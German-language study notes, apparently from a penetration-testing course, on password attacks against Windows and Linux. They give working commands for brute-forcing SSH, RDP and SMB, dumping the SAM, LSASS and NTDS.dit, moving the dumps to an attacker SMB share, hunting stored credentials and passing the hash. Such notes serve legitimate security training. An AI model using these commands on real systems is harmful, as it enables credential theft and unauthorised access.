Passwort Attacks
Introduction
1. Theory of Protection:
- Vertraulichkeit, Integritaet, Verfuegbarkeit zwischen diesen 3 Eigenschaften muss eine Balance herrschen
- Wir validieren die Rechte fuer jeden User und jedes Item (Authorisierung)
- Ausserdem validieren wir die Identitaet des User(Authentifizierung)
- Die meisten Einbrueche sind auf den Verlust von einem der 3 Eigenschaften zuerueckzufuehren
- Dieses Modul wird sich auf die Authentifizierung fokusieren

- Authentifizierung:
	- Authentifizierung bedeutet im Kern die Validierung der Identitaet um 3 Hauptfaktoren miteinander zu verknuepfen
		- 1. Something you know(Passwort, Passcode, Pin, etc)
		- 2. Something you have(ID Card, Sicherheits Key, MFA Tool, etc)
		- 3. Something you are(Username, Email, physisches Selbst)
	- Der Prozess der Authentifizierung kann kann mehrere Faktoren verwenden
	- Ein Sicherheitskritischer Zugang benoetigt haeufig alle 3 Faktoren

- The Use of Passwords:
	- Die meisten Authentifizierung Methoden verwenden immernoch Passwoerter 
	- Ein Passwort ist eine Kombination von Zeichen, Zahlen und Symbolen
	- Ein Passwort mit 8 stelliges Passwort verfuegt ueber wenn es nur aus Grossbuchstaben und Zahlen besteht aus 36^8(208.827.064.576) Zeichen
	- PandaSecurity hat Statistiken ueber verwendete Passwoerter 
	- 24% der Amerikaner verwenden Passwoerter wie passwort, Qwerty, 123456
	- 66% aller Amerikaner verwenden Ihr Passwort wieder

2. Credential Storage:
- Jede Anwendung unterstuezt Authentifizierung Mechanismen die Credentials werden in lokalen oder remote Datenbanken gespeichert
- Wir koennen eine Wortlist verwenden um das Passwort zu raten ein Beispiel dafuer ist rockyou.txt welches die haeufigsten Passwoerter ueberprueft
- Passwoerter koennen auch mit einer SQL Injection in einer Web Anwendung ausgelesen werden 

- Linux:
	- In Linux ist alles eine Datei
	- Passwoerter werden in einer shadow Datei in /etc/shadow gespeichert
	- Die Passwoerter werden als Hashes gespeichert mit Salt gespeichert
	- Zuerst steht der Name dann der Typ der Cryprographischen Hash Methode, dann der Salt und dann das gehaschte Passwort
	- /etc/shadow kann nur von dem User root gelesen werden
	- In /etc/passwd wurden alle Usernamen mit Passwoerter gespeichert
	- Wenn ein Passwort verschluesselt ist steht in dem Passwortfeld ein 'X'
	- In /etc/group werden die Gruppenummern und Gruppennamen einandere zugeordnet und dem Benutzer zugeordnet

- Windows Authentifizierung Prozess:
	- In Windows ist der Authentifizierung Prozess komplizierter als der in Linux Systemen
	- Es gibt viele Module wie das Kerberos Modul
	- Das Local Security Authority(LSA) ist ein geschuetztes Subsystem welches die User authentifiziert 
	- LSA speichert Informationen ueber alle Aspekte der lokalen Sicherheit auf einem Computer anderen Services stellt das Modul security IDs(SIDs) bereit

	- Windows Authentication Process Diagram:
		- Lokale logins werden mit dem Prozess WinLogon performt
		- In dem Interface LogonUI werden die Credentials eingegeben
		- Andere Prozesse sind LSASS, andere authentifizierungs Pakete, SAM oder Active Directory
		- Authentifizierungs Pakete sind Dynamic-Link Libraries(DDLs) die einen Authentifizierungs Check starten
		- Winlogon ist ein vertrauenswuerdiger Prozess fuer Sicherheitsrelevante User Interaktionen zu den Aufgaben gehoert
			- Launching LogonUI fuer Eingabe von Passwort zum Login
			- Passwortaenderung
			- Sperren oder Entsperren des Arbeitsplatzes

	- LSASS:
		- Local Security Authority Subsystem System(LSASS) ist eine Sammlung von Modulen und haben Zugang zu allen Authentifizierungs Prozessen unter %SystemRoot%\System32\Lsass.exe
		- LSASS ist verantwortlich fuer die lokalen System Sicherheits Regel
		- Weitere Informationen https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN
		- Jede Login Session erstellt eine neue Instanz des Winlogon Services

	- SAM Datenbank:
		- Security Account Manager(SAM) ist eine Datenbank Datei fuer Windows um User Passwort zu speichern
		- Es kann fuer remote oder lokal Authentifizierung von User verwendet werden
		- User werden im hash Format gespeichert entweder als LM oder NTLM Hash
		- Die Datei befindet sich unter %SystemRoot%/system32/config/SAM
		- System Rechte werden benoetigt um die Datei zu lesen

		- Ein Host kann einer Workgroup oder Domaine zugeordnet werden  
		- Eine Workgroup wird von der SAM Datenbank lokal verwaltet
		- Wenn ein Host einer Domaine zugeordnet worden ist wird dieser von dem Domain Controller(DC) in Active Directory verwaltet. Dieser wird unter %SystemRoot%\ntds.dit gespeichert

		- Microsoft hat ein die SAM Datenbank geupdatet gegen offline software cracking
		- Das ist das SYSKEY.exe mit dem eine Festplatte verschlueselt werden kann

	- NTDS:
		- Jeder Domain Contoller hat eine Datei namen NTDS.dit welche ueber alle Domain Controller hinweg synchronisiert wird
		- In dieser Datei werden 
			- User account (Username und passwort Hash)
			- Group accounts
			- Computer accounts
			- Group policy objects

3. John The Ripper:
- John The Ripper (JTR oder john) ist ein essentielles Pentesting Tool fuer das cracken von gehashten Passwoertern
- Die Jumbo Variante wird Leuten in der Sicherheitsszene empfohlen, ausserdem ist diese Version besser im cracken von Passwoertern

- Attack Methods:
	- Dictionary Attacks:
		- Dictionary attacks beziehen sich auf vor-generierte Liste an Woertern und Phrasen um ein Passwort zu knacken
		- Diese Liste wird dann mit dem Hash abgeglichen
		- Dieser Angriff ist sehr effizient und gibt dem Angreifer einen Weg in das System
	
	- Brute Force Attacks:
		- Brute Force Attacks probieren jede Kombination von Zeichen fuer das Passwort aus
		- Es ist extrem langsam und sollte nur verwendet werden wenn keine Alternative zur Verfuegung steht

	- Rainbow Table Attacks:
		- Involvieren vorberechnete Tabellen von Hash und deren zugehoeriger Klartext
		- Jeder Hashwert muss in der Tabelle vorhanden sein damit er geknackt werden kann

- Cracking Modes:
	- Single Crack Mode ist einer der gaengisten Modes in JTR
	- Es handelt es sich um einen brute-force Angriff 
	- < john --format=[hash_type] [hash or hash_file] >
	- Ein Beispiel waere <john --format=sha256 hashes_to_crack.txt>

- Wordlist Mode:
	- Wordlist Mode verwendet zum cracken von Passwoertern viele Listen von Woertern
	- Es ist ein Dictionary Attack was heisst, dass es eine Liste an Worten abarbeitet um das richtige Passwort zu finden
	- Es ist viel effizienter als der Cracking Modus und kann mehrere Passwoerter gleichzeitig cracken
	- < john --wordlist=[wordlist_file] --rules [hash_file] >

- Incremental Mode:
	- Ist ein erweiterte Modues zum cracken von Passwoertern mit einem Zeichensatz als Vorgabe
	- Prueft eine Kombination aus allen Kombinationen und dem Zeichensatz
	- Arbeitet am besten wenn wir Teile des Passworts wissen
	- <john --incremental [hash_file]>

- Cracking Files:
	- Es ist ausserdem moeglich Passwort geschuetzte Dateien mit John zu cracken
	- <[tool] [file_to_crack] > file.hash>
	- <pdf2john server_doc.pdf > server_doc.hash>

###################################################################################################
Remote Passwort Attacks
1. Network Services:
- Jeder Computer im Netzwerk wird verschiedenste Services laufen haben all diese Services haben spezielle Rechte und bestimmten Usern zugewiesen werden
- Um bei anderen Windows Server sich einzuloggen kann RDP, WinRM und SSH verwendet werden

- Windows Remote Management (WinRM):
	- Ist eine Microsoft Implementierung von dem Netzwerkprotokoll Web Services Management Proco(WS-Management), basiert auf dem Netzwerkprotokoll XML Web Services das Simple Object Access Protocol(SOAP) verwendet
	- Es sorgt fuer die Kommunikation zwischen Web-Based Enterprise Management (WBEM) und Windows Management Instrumentation (WMI) die beiden rufen das Distributed Component Object Model (DCOM) auf
	- WinRM verwendet den TCP Port 5985 fuer HTTP und 5986 fuer HTTP


- CrackMapExec:
	- Installieren von CrackMapExec <sudo apt-get -y install crackmapexec>
	- CrackMapExec unterstuezt MSSQL, SMB, SSH und WinRM
	- Aufuehren <crackmapexec [proto] [target-IP] -u [user or userlist] -p [password or passwordlist]>


- Evil-WinRM:
	- Installieren von Evil-WinRM <sudo gem install evil-winrm>
	- Ausfuehren <evil-winrm -i [target-IP] -u [username] -p [password]>
	- Wenn das funktioniert wird eine Terminal Session mit PowerShell Remoting Protocol(MS-PSRP) geoffnet

- Secure Shell(SSH):
	- SSH ist eine sichere Moeglichkeit um sich mit eiem remote host zu verbinden und befehle und Dateien zu tranferieren
	- SSH Server laeuft standardmaessig auf TCP Port 22 
	- Es gibt 3 verschiedenste Optionen:
		- Symmetric Encryption:
			- Symetrische Verschluesselung verwenden den gleichen Schluessel fuer Ver-und Entschluesselung
			- Der Diffie-Hellman Keyaustausch wird dafuer verwendet
		- Asymmetrical Encryption:
			- Verwenden 2 verschiedene Schluessel einen privaten- und einen oeffentlichen Schuessel
			- Der Private Schuessel muss geheim bleiben, da er alle Nachrichten entschluesseln die mit dem Public Key verschluesselt worden sind
		- Hashing:
			- Die Hash Methode verwendet Hash um die Echtheit der Nachricht zu pruefen

	- Hydra - SSH
		- Mit Hydra kann das Passwort fuer SSH mit brute force gebrochen werden
		- <hydra -L user.list -P password.list ssh://10.129.42.197>


- Remote Desktop Protocol (RDP):
	- RDP ist ein Netzwerkprotokoll um Zugang zu remote Windows System zu bekommen
	- RDP verwendet standardmaessig den TCP Port 3389
	- Mit xfreerdp verbindet man sich mit RDP xfreerdp /v:<target-IP> /u:<username> /p:<password>

	- Hydra - RDP:
		- <hydra -L user.list -P password.list rdp://10.129.42.197>


- Server Message Block (SMB):
	- Mit dem SMB Protokoll koennen Daten zwischen Server und Client transferirert werden
	- Wird verwendet um Daten, Verzeichnisse, Drucker Services zwischen Windows Netzwerken zu uebertragen

	- Hydra - SMB:
		- <hydra -L user.list -P password.list smb://10.129.42.197>
	
	- Metasploit Framework:
		- use auxiliary/scanner/smb/smb_login
		- Um Informationen ueber SMB zu erhalten

	- CrackMapExec:
		- Mit CrackMapExec koennen mit User und Passwort alle Shares gefunden werden

2. Passwort Mutations:
- Es sollte Passwortrichtlinien geben damit User eine gutes Passwort
- Meistens haben Mitarbeiter ihren Geburtstag in ihrem Passwort dieser kann leicht herausgefunden werden
- Mitarbeiter wollen ihr Passwort so simpel halten wie nur moeglich
- Laenger als 10 Zeichen sollte dafuer reichen, in das Passwort kann etwas Bekanntes eingebaut sein

- Hashcat:
	- Hashcat ist ein sehr starkes Tool um eine Wortliste zu erstellen mit einer Kombination mit Namen und Labels
	- Fuer Hashcat gibt es vordefinierte Regeln fuer Wortlisten

- CeWL:
	- Das Tool CeWL erstellt eine Wortliste aus einer Firmen Webseite
	- Mit -d wird die Tiefe gesetzt
	- Mit -m wird die minimum Laenge der Worte gesetzt
	- Mit --lowercase werden alle Worte in Kleinbuchstaben gespeichert
	- Mit -w geben wird die Datei in der wir den Output speichern

3. Passwort Reuse / Default Passwords:
- Fuer Konfigurationszwecke werden meistens die standard Credentials verwendet dann wird das Passwort beim transferieren vergessen
- Manchmal koennen auch die standard Credentials vergessen werden zu aendern

- Credential Stuffing:
	- Es gibt viele Datenbanken die die standard Credentials enthalten 
	- https://github.com/ihebski/DefaultCreds-cheat-sheet
	- Default Credentials koennen auch in der Product Dokumentation gefunden werden
	- Dieser Angriff wird Credential Stuffing genannt

###################################################################################################
Windows Local Password Attacks
1. Attacking SAM:
- Wenn wir einen Windows Host angreifen der zu keiner Domaine gehoert koennen wir die SAM Datenbank angreifen
- Diesen Angriff koenen wir auch offline durchfuehren

- Copying SAM Registry Hives:
	- Es gibt 3 Registry Stoecke die wird kopieren koennen wenn wir admin Zugang haben:
		- hklm\sam: Enthaelt die Hashes der Passwoerter von lokalen Account
		- hklm\system: Enthaelt den System Bootkey mit dem die SAM Datenbank verschluesselt ist. 
		- hklm\security: Enthaelt cashed Credentials fuer Domain Accounts. 
	- Wir koennen mit reg.exe Backups erstellen

- Using reg.exe save to Copy Registry Hives:
	- In CMD koennen alle Hives runtergezogen werden
	- reg.exe save hklm\sam C:\sam.save
	- reg.exe save hklm\system C:\system.save
	- reg.exe save hklm\security C:\security.save
	- Technisch gesehen benoetigen wir nur SAM und SYSTEM, SECURITY kann aber auch hilfreich sein mit Domain User Accounts
	- Wenn die Hives runtergeladen worden sind kann Impackts smbserver.py verwendet werden um den Hive anzugreifen
	- https://github.com/fortra/impacket/blob/master/examples/smbserver.py

- Creating a Share with smbserver.py:
	- Wir muessen nur den Share Namen und das Verzeichnis zum Attack Host wissen
	- Mit der option -smb2support werden auch neue SMB Versionen unterstuezt
	- 
	- sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

- Moving Hove Copies to Share:
	- Mit move koennen wir die Hive Kopien zu den Shares bewegen
	- mmove sam.save \\10.10.15.16\CompData
	- Mit ls koennen wir uns sie Shares anzeigen lassen

- Dumping Hashes with Impacket's secretsdump.py:
	- Mit secretsdump.py koennen wir offline die Hashes knacken
	- python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

- Cracking Hashes with Hashcat:
	- Wenn wir die Hashes haben koennen wir anfangen diese mit Hachcat zu knacken
	- Wir koennen die NT Hashes in eine Datei kopieren
	- sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

- Remote Dumping & LSA Secrets Considerations:
	- Wenn wir Zugriff auf einen Account mit local admin privileges haben koenenn wir die LSA Secrets ueber das Netzwerk knacken
	- crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
	- crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

2. Attacking LSASS:
- LSASS ist ein kritischer Service und spielt eine zentrale Rolle im Credential Managament und dem Authentifizierungsprozess
- Bei der Erstanmeldung wird LSASS:
	- Credentials lokal im memory cachen
	- Access Token erstellen
	- Durchsetzten von Security Policies
	- Schreiben von Windows Sicherheits Log

- Dumping LSASS Process Memory:
	- Es ist schlau eine Kopie von dem LSASS Prozess Datei zu machen via einem memory dump
	- Wenn wir Dateien lokal auf unserem PC haben, haben wir mehr Zeit um den Hash zu knacken
	- Task Manager Method:
		- Wenn wir Zugriff auf einem graphischen Desktop haben koennen wir den Task Manager verwenden um ein memory dump auszufuehren
		- Hierfuer muessen wir nur auf Prozess klicken um dann ein dump file zu erstellen
		- Der Prozess heisst Local Security Authority Process
		- Die Datei lsass.DMP wird unter C:\Users\loggedonusersdirectory\AppData\Local\Temp erstellt

- Rundll32.exe & Comsvcs.dll Method:
	- Wenn wir keinen graphischen Desktop haben koennen wir den Befehl <rundll32.exe> ausfuehren
	- Moderne Anti-Virus Tools wuerden wohl diesen Befehl ueberwachen und ihn als boesartige Aktivitaet ansehen
	- Dafuer muessen wir die Process ID(PID)von lsass.exe haben
	- Mit <tasklist /svc> kann die PID in CMD ausgegeben weren
	- Mit <Get-Process lsass> kann die PID in PowerShell ausgegeben weren 
	- In PowerShell koennen wir auch einen lsass.dmp erzeugen mit <rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full>

- Using Pypykatz to Extract Credentials:
	- Wenn wir die dump Datei haben koennen wir mit dem Pypykatz Tool die Credentials extrahieren
	- LSASS speichern Credentials einer aktiven Login Session in Windows Systemen
	- <pypykatz lsa minidump /home/peter/Documents/lsass.dmp>
	- In der Auageb ist ein Teil MSV enthalten

- MSV:
	- MSV ist ein Authentifizierung Paket fuer Windows das LSA auruft bei jedem Login Versuch
	- Pypykatz extrahiert die SID, Usernamen, Domain, NT und SHA1 Passwort Hashes

- WDIGEST:
	- WDIGEST ist ein altes Authentifizierungsprotokoll fuer Windows XP bis Windows 8 und Windows Server 2003 bis Windows Server 2012
	- LSASS cashed Credentials von WDIGEST in Klartext

- Kerberos:
	- Kerberos ist das Netzwerk Authentifizierungs Protkoll fuer Active Directory in Windows Domain Umgebungen
	- Domain User erhalten ein Ticket bei der Authentifizierung mit Active Directory
	- Das Ticket wird verwendet um den Zugriff auf gemeinsame Ressourcen zu ermoeglichen

- DPAPI:
	- Data Protection Application Programming Interface(DPAPI) ist eine Sammlung von APIs in Windows um Informationen von Usern zu ent- und verschluesseln
	- Viele Anwendungen verwenden DPPAI wie Internet Explorere, Google Chrome, Outlook, Remote Desktop Connection, Credential Manager usw

3. Attacking Active Directory & NTDS.dit:
- Active Directory(AD) ist Verzeichnis Service fuer moderne Unternehmensnetzwerke
- Wenn Unternehmen Windows verwendet kommt sicher AD zum Einsatz
- Wir koennen Credentials aus der NTDS.dit Datei extrahieren
- Das Ziel muss ueber das Netzwerk erreichbar sein
- Es kann sein, dass remote desktop protocol(3389) weitergeleietet werden an einen edge router
- Wenn ein Windows Host in einer Domaine ist, wird nicht laenger die SAM Datenbank fuer Authentifizierung verwendet
- Alle Authentifizierungs Anfragen werden dannan den Domain Controller weitergeleitet
- Wenn sich ein User lokal einloggen moechte kommt die SAM Datenbank zum Einsatz

- Dictionary Attacks against AD accounts using CrackMapExec:
	- Ein Dictionary Attack kann sehr laut sein und kann nach Zeit abgelehnt werden
	- Hier koenen wir nach Namen von Mitarbeitern suchen und dadurch die Suche einschraenken
	- Die meisten Unternehmen haben einen Regel fuer Namensgebung(firstname.lastname, ...)
	- Meistens geben uns Emails Teile einer Struktur (Name@Domain)

- Creating a Custom list of Usernames:
	- Wir erstellen eine benutzerdefinierte Liste von Benutzernamen
	- Wir koennen das manuell machen oder das Tool Username-Anarchy verwenden

- Launching the Attack with CrackMapExec:
	- Wenn wir die Liste erstellt haben koennen wir mit CrackMapExec den Domain Controller angreifen
	- Mit SMB koennen wir mit dem Domain Controller kommunizieren
	- crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

- Event Logs from the Attack:
	- Jeder admin auf einem Windows Host kann den Event Viewer verwenden um die Security Events zu sehen
	- Wenn wir Credentials haben koennen wir remote Zugang auf den Ziel Domain Controller bekommen und die NTDS.dit Datei bekommen

- Capturing NTDS.dit:
	- NT Directory Services (NTDS) ist ein Verzeichnis Service welches mit AD zusammen verwendet wird um Netzwerk Ressourcen zu organisieren
	- Die NTDS.dit Dattei ist in %systemroot$/ntds auf dem Domain Controller des Forest gespeichert
	- .dit steht fuer directory information tree
	- In dieser Datei steht der Domain Username, Passwort Hashes, und andere kritische Informationen

- Connecting to a Domain Controller with Evil-WinRM:
	- evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
	- Evil-WinRM verbindet sich mit dem Ziel indem es Windows Remote Management verwendet
	- Ausserdem wird eine PowerShell Sitzung etabliert 

- Checking Local Group Membership:
	- Wir koennen ueberpruefen welche Priviligien ein User hat
	- Um NTDS.dit Dateien zu kopieren benoetigen wir Administrator Group oder Domain Admins Group Rechte haben
	- <net user [User_Name]>

- Creating Shadow Copy of C:
	- Wir koennen mit vssadmin verwenden um ein Volume Shadow Copy(VSS) vom C: Laufwerk zu erstellen
	- NTDS wird wahrscheinlich auf dem C Laufwerk gespeichert werden

- Copying NTDS.dit from the VSS:
	- Wir koennen die NTDS.dit Datei vom C Laufwerk an eine andere Stelle kopieren um uns vorzubereiten die Datei auf den Attack Host zu kopieren
	- cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
	- Ausserdem sollten wir ein SMB Share auf dem Attack Host oeffnen

- Tranferring NTDS.dit to Attack Host:
	- Kann verwendet werden um die NTDS.dit Datei vom Ziel auf den Angreifer zu kopieren
	- cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

- A Faster Method: Using cme to Capture NTDS.dit:
	- Wir koennen auch CrackMapExec verwenden um die Schritte durchzufuehren
	- crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

- Cracking Hashes & Gaining Credentials:
	- Wir sollten eine Text Datei erstellen mit NT Hashes oder die Hashes in den Befehl kopieren
	- sudo hashcat -m 1000 Hash/HashFile /usr/share/wordlists/rockyou.txt
	- Wenn wir den Hash nicht knacken koennen koennen wir den Angriff Pass-the-Hash(PtH) verwenden
	- Ein PtH Angriff nutzt das NTLM Authentifizierungs Protokoll aus um einen User mit einem Passwort Hash zu authentifizieren
	- Anstelle von username:clear-text password koennen wir username:password hash verwenden
	- evil-winrm -i 10.129.201.57  -u  Administrator -H "<Hash>"

4. Credential Hunting in Windows:
- Wenn wir Zugang zu einer Windows Maschine haben vio GUI oder CLI koennen wir Credential Huting durchfuehren
- Credential Hunting ist das Finden von Credentials im Systemen durch alle Dateisysteme

- Search Centric:
	- Die meisten Tools in Windows haben eine Suchfuntkion die wir nutzen koennen
	- Manche User haben ihr Passwort in Dateien gespeichert

- Key Terms to Search:
	- Ob wir Zugang ueber GUI oder CLI haben, kann man nach verschiedenen Schluesselworten suchen
	- Passwords, Passphrases, Keys, Username, User account, Creds, Users, Passkeys, Passphrases, configuration, dbcredential, dbpassword, pwd, Login, Credentials

- Search Tools:
	- Wenn wir Zugriff auf eine GUI haben koennen wir Windows Search verwenden
	- Wir koennen ausserdem Lazagne verwenden um Passwoerter im Web Browser zu bekommen
	- Die Lazagne.exe koennen wir mit xfreerdp rueberkopieren

- Lazagne:
	- Mit <start lazagne.exe all> Lazagne starten
	- Die Option -vv koennen wir sehen was lazagne im Hintergrund durchfuehrt

- Using findstr:
	- Wir koennen findstr verwenden um Muster in Dateien zu finden
	- findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

- Additional Considerations:
	- Es ist ein Unterschied ob es sich um einen Server oder einen Desktop handelt
	- Hier sind andere Orten an denen sich Passwoerter befinden koennen:
		- Passwords in Group Policy in the SYSVOL share
		- Passwords in scripts in the SYSVOL share
		- Password in scripts on IT shares
		- Passwords in web.config files on dev machines and IT shares
		- unattend.xml
		- Passwords in the AD user or computer description fields
		- KeePass databases --> pull hash, crack and get loads of access.
		- Found on user systems and shares
		- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint

###################################################################################################
Linux Local Password Attacks
1. Credential Hunting in Linux:
- Wenn wir Zugang zu einem System haben ist der erste Schritt das auffinden von Credentials
- Wir koennen in Browsern, Datenbanken, Notizen, Command-line History usw

- Files:
	- Alles in Linux ist eine Datei
	- Die Konfigurationsdateien enden mit .config, .conf, .cnf
	- Diese Konfigurationsdateien enthalten oft sehr wichtige Informationen
	- Hiermit koennen alle Konfigurationsdateien angezeigt werden 
		- for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
	- Wir koennen ausserdem in diesen Dateien nach Worten wie ("user","password","pass") suchen
		- for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
	- Wir koennen auch nach Datenbankdateien suchen
		- for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
	- Wir koennen auch nach Notizen suchen
		- find /home/* -type f -name "*.txt" -o ! -name "*.*"

- Scripts:
	- Hiermit koennen wir nach Scripts suchen
		- for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
	- Cronjobs sind unabhaengige durch das Systemverteilte User Dateiendungen
	- Es gibt verschiedene Formen von Crontabs /etc/cron.daily, /etc/cron.hourly

- SSH Keys:
	- SSH Keys sind die Zutrittkarten fuer das SSH Protokoll
	- Es gibt einen privaten-und public key 
	- Der public Key verifiziert die Signatur des privaten Keys
	- SSH Private Keys:
		- grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
	- SSH Public Keys:
		- grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

- History:
	- Die History enthaelt die vorherigen Befehle die ausgefuehrt worden sind 
	- tail -n5 /home/*/.bash*

- Logs:
	- Log Dateien sind essentieller Teil von Linux 
	- Die meisten Services schreiben in diese Arte von Datei
	- In /var/log/ befinden sich die meisten Logs
		- for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

- Memory and Cache:
	- Viele Anwendungen und Prozesse speichern die Credentials fuer die Authentifizierung im Cache oder in Dateien
	- Auf Linux gibt es ein Tool namens mimipenguin mit dem Credentials aus dem System suchen kann
	- Auch Lazagne kann dafuer genutzt werden um Linux Hosts durchzusuchen

- Browsers:
	- Browser speichern Credentials lokal auf dem System
	- Firefox speichert die Credentials in logins.json
	- ls -l .mozilla/firefox/ | grep default
	- cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
	- Das Tool Firefox Decrypt eignet sich gut um Credentials zu entschluesseln
	- python3.9 firefox_decrypt.py
	- Alternativ kann LaZagne verwendet werden um di eCredentials zu finden
	- python3 laZagne.py browsers

2. Passwd, Shadow & Opasswd:
- Linux hat viele Authentifizierungs Mechanismen
- Einer der meist verwendeten ist Pluggable Authentication Modules(PAM)
- Das Modul befindet sich in /usr/lib/x86_x64-linux-gnu/security/
- Das Modul verwaltet Passwoerter, User Informationen, Authentication, Sessions, Passwort, Altes Passwort
- Wenn wir das Passwort aendern wollen wird PAM aufgerufen
- Die standard Datei ist /etc/passwd und /etc/shadow

- Passwd File:
	- /etc/passwd enthaelt alle Informationen fuer alle User auf dem System
	- Die Informationen werden mit einerm Doppelpunkt getrennt
	- Login name : Password info: UID : GUID : Full name/comments : Home directory : Shell
	- /etc/shadow enthaelt die Hashed Passwoerter
	- Wenn das Passwort gehashed ist steht bei dem Wert Passwort ein 'X'

- Shadow File:
	- Fuer die shadow Datei benoetigen wir sudo Rechte
	- sudo cat /etc/shadow
	- In der Shadow Datei befinden sich 9 Spalten
	- Username: Encrypted password : Last PW change : Min. PW age: Max. PW age : Warning period : 	Inactivity period : Expiration date: Unused
	- Wenn sich in dem Password Feld '!' oder '*' kann man sich nicht mit einem Unix Passwort anmelden, eine Anmeldung ist nur moeglich mit Kerberos und Key-bases Authentifizierung
	- Eine Verschluesseltes Passwort besteht aus: 
		- $<type>$<salt>$<hashed>
		- Types sind:
			- $1$ – MD5
			- $2a$ – Blowfish
			- $2y$ – Eksblowfish
			- $5$ – SHA-256
			- $6$ – SHA-512
		- Standard Typ ist SHA-512

- Opasswd:
	- PAM kann das Nutzen von alten Passwoertern verbieten
	- Alte Passwoerter werden in /etc/security/opasswd gespeichert
	- Hierfuer benoetigen wir auch root Rechte

- Cracking Linux Credentials:
	- Wenn wir manche Hashes gesammelt haben
	- Unshadow:
		- sudo cp /etc/passwd /tmp/passwd.bak
		- sudo cp /etc/shadow /tmp/shadow.bak
		- unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
	- Hashcat - Cracking Unshadowed Hashes:
		- hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
	- Hashcat - Cracking MD5 Hashes:
		- hashcat -m 500 -a 0 md5-hashes.list rockyou.txt

###################################################################################################
Windows Lateral Movement
1. Pass the Hash(PtH):
- Ein Pass the Hash(PtH) Angriff indem ein Angreifer den Hash eines Passworts verwendet anstatt das Klartext Passwort
- PtH nutzt das Authentifizierungs Protokoll aus, weil der Hash des Passworts gleich bleibt

- Windows NTLM Introduction:
	- Microsofts Windows New Technology LAN Manager(NTLM) ist eine Sammlung von Sicherheitsprotokolle
	- Die Probleme von NTLM sind bekannt, dennoch wird NTLM weiterhin verwendet
	- Bei den meisten Systemen hat Kerberos den Platz von NTLM eingenommen hat
	- In NTLM werden Hash ohne Salt gespeichert

- Pass the Hash with Mimikatz(Windows):
	- Mit Mikikatz kann ein Pass the Hash Angriff durchgefuehrt werden
	- Mikikatz hat ein Modul sekurlsa::pth mit dem der Pass the Hash Angriff durchgefuehrt werden kann
	- Wir benoetigen folgende Dinge:
		- /user: Der User als der wir uns ausgeben wollen
		- /rc4 order /NTLM: NTML Hash von dem User
		- /domain: Domain von dem User
		- /run: Das Programm mitdem wir das Programm ausfuehren koennen

- Pass the Hash with PowerShell Invoke-TheHash(Windows):
	- In PowerShell koennen wir Invoke-TheHash verwenden um einen Pass the Hash Angriff durchzufuehren
	- Folgende Parameter muessen gesetzt werden:
		- Target: Hostname oder IP Adresse vom Ziel
		- Username: Username fuer Authentifizierung
		- Domain: Domain fuer die Authentifizierung
		- Hash: NTLM Hash fuer die Authentifizierung
		- Command: Befehl um auf dem Ziel auszufuehren hier einen Befehl fuer eine ReverShell einzufuegen

- Pass the Hash with Impacket(Linux):
	- Impacket hat viele Tools wie COmmand Execution, Credential Dumping, Enumeration, usw

	- Pass the Hash with Impacket PsExec:
		- impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
	- Wir haben viele andere Tools im Impacket Toolkit um Befehle auszufuehren:
		- impacket-wmiexec
		- impacket-atexec
		- impacket-smbexec

- Pass the Hash with CrackMapExec(Linux):
	- CrackMapExec ist ein Post-Exploitation Tool mit dem die Sicherheit von Active Directory ueberprueft werden kann
	- Wir koennen CrackMapExec verwenden um uns bei manchen Hosts im Netzwerk als local admin zu authentifizieren
	- Diese Methode wird Password Spraying genannt
	- crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
	- Hier verwenden wir den Hash des Adminstrators
	- CrackMapExec - Command Execution:
		- crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

- Pass the Hash with evil-winrm(Linux):
	- evil-winrm ist ein weiteres Tool um uns mit Pass the Hash mit PowerShell zu authentifizieren
